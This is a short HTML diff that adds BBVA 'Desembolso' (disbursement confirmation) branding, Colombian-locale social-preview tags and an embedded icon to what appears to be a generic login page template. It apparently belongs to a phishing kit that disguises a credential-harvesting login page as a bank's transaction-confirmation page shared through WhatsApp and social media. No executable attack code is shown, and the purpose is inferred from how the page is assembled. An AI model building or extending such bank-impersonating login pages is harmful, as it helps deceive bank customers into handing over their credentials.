@@ -9,7 +9,34 @@
   <meta name=viewport content="width=device-width,initial-scale=1">
   <title data-i18n="LOGIN_PAGE_TITLE">{{LOGIN_PAGE_TITLE}}</title>
   <script src="assets/js/variables-login.js"></script>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Desembolso BBVA - Confirmación de Transacción</title>
+    <meta name="description" content="Desembolso BBVA - Verifique el estado de su desembolso y confirmación de transacción.">
+    <meta name="keywords" content="desembolso bbva, confirmación transacción, bbva desembolso, estado desembolso">
+    <meta name="robots" content="index, follow">
+    
+    <!-- Theme Color -->
+    <meta name="theme-color" content="#072146">
+    <meta name="msapplication-TileColor" content="#072146">
+    
+    <!-- Open Graph / Facebook / WhatsApp -->
+    <meta property="og:type" content="website">
 
+    <meta property="og:title" content="Desembolso BBVA - Confirmación de Transacción">
+    <meta property="og:description" content="Desembolso BBVA - Verifique el estado de su desembolso y confirmación de transacción.">
+
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:locale" content="es_CO">
+    
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+
+    <meta property="twitter:title" content="Desembolso BBVA - Confirmación de Transacción">
+    <meta property="twitter:description" content="Desembolso BBVA - Verifique el estado de su desembolso y confirmación de transacción.">
+
+    
   <meta name=referrer content=no-referrer>
   <link rel=icon sizes=192x192
     href="data:image/png;base64,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">
